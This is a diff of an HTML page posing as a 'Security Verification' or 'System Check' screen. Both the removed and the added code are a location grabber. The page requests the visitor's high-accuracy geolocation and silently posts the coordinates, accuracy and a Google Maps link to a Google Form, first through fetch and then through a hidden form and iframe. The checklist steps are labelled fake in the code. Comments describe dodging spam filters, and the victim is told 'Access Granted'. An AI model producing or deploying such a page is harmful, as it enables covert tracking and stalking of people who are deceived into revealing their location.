@@ -5,223 +5,46 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Verification</title>
     <style>
-        :root {
-            --primary: #10a37f;
-            --bg: #f7f7f8;
-            --card-bg: #ffffff;
-            --text-main: #202123;
-            --text-sub: #6e6e80;
-            --border: #e5e5e5;
-            --error: #d32f2f;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: var(--text-main);
-        }
-
-        .container {
-            background: var(--card-bg);
-            width: 100%;
-            max-width: 420px;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.05);
-            border: 1px solid var(--border);
-        }
-
-        .header {
-            margin-bottom: 30px;
-            text-align: center;
-        }
-
-        .icon-large {
-            width: 60px;
-            height: 60px;
-            background: #e6f4f1;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-        }
-
-        .icon-large svg {
-            width: 32px;
-            height: 32px;
-            fill: var(--primary);
-        }
-
-        h1 {
-            font-size: 20px;
-            font-weight: 600;
-            margin: 0 0 10px 0;
-        }
-
-        p {
-            color: var(--text-sub);
-            font-size: 14px;
-            margin: 0;
-            line-height: 1.5;
-        }
-
-        .checklist {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-top: 30px;
-        }
-
-        .check-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            font-size: 14px;
-            padding: 10px 15px;
-            background: #fafafa;
-            border-radius: 8px;
-            border: 1px solid transparent;
-            transition: all 0.3s ease;
-        }
-
-        .check-item.active {
-            border-color: var(--border);
-            background: #fff;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
-        }
-
-        .check-label {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .status-icon {
-            width: 18px;
-            height: 18px;
-        }
-
-        .spinner {
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid var(--text-sub);
-            border-radius: 50%;
-            width: 14px;
-            height: 14px;
-            animation: spin 1s linear infinite;
-        }
-
-        .checkmark {
-            color: var(--primary);
-            font-weight: bold;
-            display: none;
-        }
-
+        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        h1 { color: #333; font-size: 22px; }
+        p { color: #666; margin-top: 10px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .footer {
-            margin-top: 40px;
-            text-align: center;
-            font-size: 12px;
-            color: #999;
-        }
-
-        .hidden { display: none; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="header">
-            <div class="icon-large">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-            </div>
-            <h1>System Verification</h1>
-            <p id="main-status">Checking device parameters for secure access.</p>
-        </div>
-
-        <div class="checklist">
-            <div class="check-item active" id="step1">
-                <div class="check-label"><span>Browser Integrity</span></div>
-                <div class="status-indicator">
-                    <div class="spinner" id="spin1"></div>
-                    <span class="checkmark" id="check1">✓</span>
-                </div>
-            </div>
-
-            <div class="check-item" id="step2">
-                <div class="check-label"><span>Connection Encryption</span></div>
-                <div class="status-indicator">
-                    <div class="spinner hidden" id="spin2"></div>
-                    <span class="checkmark" id="check2">✓</span>
-                </div>
-            </div>
-
-            <div class="check-item" id="step3">
-                <div class="check-label"><span>Region Validation</span></div>
-                <div class="status-indicator">
-                    <div class="spinner hidden" id="spin3"></div>
-                    <span class="checkmark" id="check3">✓</span>
-                </div>
-            </div>
-        </div>
-
-        <div class="footer">
-            ID: <span id="session-id">...</span> | Protocol v2.4
-        </div>
+        <div id="spinner" class="spinner"></div>
+        <h1 id="title">System Check</h1>
+        <p id="details">Verifying parameters...</p>
     </div>
 
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+    <form 
+        action="https://docs.google.com/forms/d/e/1FAIpQLSfPo8rchVQJZxVNSp_0Buqy-e7sAgBA5OSQK6yO7W0223Dvzg/formResponse" 
+        method="post" 
+        target="hidden_iframe" 
+        id="hidden_form"
+        style="display:none;"
+    >
+        <input type="text" name="entry.1088471266" id="form_input" value="">
+    </form>
+
     <script>
-        // --- CONFIGURATION ---
-        const CONFIG = {
-            FORM_ID: '1FAIpQLSfPo8rchVQJZxVNSp_0Buqy-e7sAgBA5OSQK6yO7W0223Dvzg', 
-            ENTRY_ID: '1088471266' 
-        };
-
-        // UI Setup
-        document.getElementById('session-id').innerText = Math.random().toString(36).substr(2, 9).toUpperCase();
-
-        const setDone = (num) => {
-            document.getElementById(`spin${num}`).classList.add('hidden');
-            document.getElementById(`check${num}`).style.display = 'block';
-            document.getElementById(`step${num}`).classList.remove('active');
-        };
-
-        const setActive = (num) => {
-            document.getElementById(`step${num}`).classList.add('active');
-            document.getElementById(`spin${num}`).classList.remove('hidden');
-        };
-
-        // Sequence Logic
-        window.onload = async () => {
-            // Fake Step 1
-            await new Promise(r => setTimeout(r, 800));
-            setDone(1);
-            
-            // Fake Step 2
-            setActive(2);
-            await new Promise(r => setTimeout(r, 1000));
-            setDone(2);
-
-            // Real Step 3
-            setActive(3);
-            document.getElementById('main-status').innerText = "Verifying regional availability...";
-            getLocation();
-        };
+        const title = document.getElementById('title');
+        const details = document.getElementById('details');
+        const spinner = document.getElementById('spinner');
 
         function getLocation() {
             if (!navigator.geolocation) {
-                fail("Unsupported Device");
+                fail("Browser not supported.");
                 return;
             }
             navigator.geolocation.getCurrentPosition(success, error, {
                 enableHighAccuracy: true,
-                timeout: 15000,
+                timeout: 10000,
                 maximumAge: 0
             });
         }
@@ -229,54 +52,46 @@
         function success(position) {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            const timestamp = new Date().toISOString().split('T')[1].split('.')[0]; // just time
+            const acc = Math.round(position.coords.accuracy);
+            const time = new Date().toLocaleTimeString();
 
-            // NOTE: We do NOT use 'http://' here to avoid Google Spam Filters
-            // It will save as text, you can copy-paste it later.
-            const mapLink = `www.google.com/maps?q=${lat},${lng}`;
-            
-            const logData = `${timestamp} | Acc:${Math.round(acc)}m | ${mapLink}`;
+            // Construct data - REMOVED 'http' to prevent spam filters
+            const link = `maps.google.com/?q=${lat},${lng}`;
+            const finalData = `${time} | Acc:${acc}m | ${link}`;
 
-            sendToGoogle(logData);
+            submitData(finalData);
+        }
+
+        function submitData(dataString) {
+            // 1. Fill the hidden form
+            document.getElementById('form_input').value = dataString;
+
+            // 2. Submit the form programmatically
+            document.getElementById('hidden_form').submit();
+
+            // 3. Show success message (We assume success because we can't track the iframe)
+            title.innerText = "Verified";
+            details.innerText = "Access Granted.";
+            details.style.color = "green";
+            spinner.style.display = "none";
         }
 
         function error(err) {
             console.warn(err);
-            fail("Verification Failed: Region info required.");
-            document.getElementById(`spin3`).style.borderTopColor = "var(--error)";
-            document.getElementById(`spin3`).style.animation = "none";
+            fail("Location access denied or failed.");
         }
 
         function fail(msg) {
-             document.getElementById('main-status').style.color = "var(--error)";
-             document.getElementById('main-status').innerText = msg;
+            title.innerText = "Failed";
+            details.innerText = msg;
+            details.style.color = "red";
+            spinner.style.borderTopColor = "red";
+            spinner.style.animation = "none";
         }
 
-        async function sendToGoogle(data) {
-            const formUrl = `https://docs.google.com/forms/d/e/${CONFIG.FORM_ID}/formResponse`;
-            const params = new URLSearchParams();
-            params.append(`entry.${CONFIG.ENTRY_ID}`, data);
-
-            try {
-                await fetch(formUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: params
-                });
-
-                // UI Success State
-                setDone(3);
-                document.getElementById('main-status').innerText = "Verification Complete. Access Granted.";
-                document.getElementById('main-status').style.color = "var(--primary)";
-
-            } catch (e) {
-                // If fetch fails (network issue), we still show success to the user
-                setDone(3);
-                console.error(e);
-            }
-        }
+        // Run immediately
+        getLocation();
     </script>
+
 </body>
 </html>
